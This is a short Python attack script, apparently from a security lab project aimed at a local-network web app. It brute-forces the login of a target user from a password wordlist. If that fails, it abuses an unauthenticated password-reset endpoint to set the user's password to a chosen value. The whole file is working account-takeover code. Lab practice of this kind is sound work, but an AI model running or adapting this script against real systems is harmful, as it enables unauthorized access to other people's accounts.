import requests

BASE_URL = "http://192.168.56.1/CyberProject/" 
LOGIN_URL = BASE_URL + "login.php" 
RESET_URL = BASE_URL + "reset_password.php"

TARGET_USER = "carlos"
NEW_PASSWORD = "123123"

def try_brute_force(filename="passwords.txt"):
    print(f"[*] Step 1: Starting Brute Force from file: {filename}")
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                # remove any whitespace characters from the password
                password = line.strip()
                if not password:
                    continue
                
                data = {
                    'username': TARGET_USER,
                    'password': password,
                    'login_submit': ''
                }
                
                try:
                    # use timeout to prevent hanging on slow responses
                    response = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
                    
                    if response.status_code == 302 or "home.php" in response.headers.get('Location', ''):
                        print(f"\n[!!!] SUCCESS! Found password in file: {password}")
                        return True
                        
                except requests.exceptions.RequestException:
                    print(f"[!] Connection error testing password: {password}")
                    continue
                    
    except FileNotFoundError:
        print(f"[!] Error: The file {filename} was not found.")
        return False

    print("[-] Brute force finished. No password from the file worked.")
    return False

def run_reset_exploit():
    print(f"\n[*] Step 2: Falling back to Broken Password Reset...")
    params = {'user': TARGET_USER}
    data = {'new_password': NEW_PASSWORD}
    
    try:
        response = requests.post(RESET_URL, params=params, data=data)
        if response.status_code == 200 and f"<strong>{TARGET_USER}</strong>" in response.text:
            print(f"[+] Reset successful! New password: {NEW_PASSWORD}")
        else:
            print("[-] Reset attack failed.")
    except Exception as e:
        print(f"[!] Connection error: {e}")

if __name__ == "__main__":
    if not try_brute_force():
        run_reset_exploit()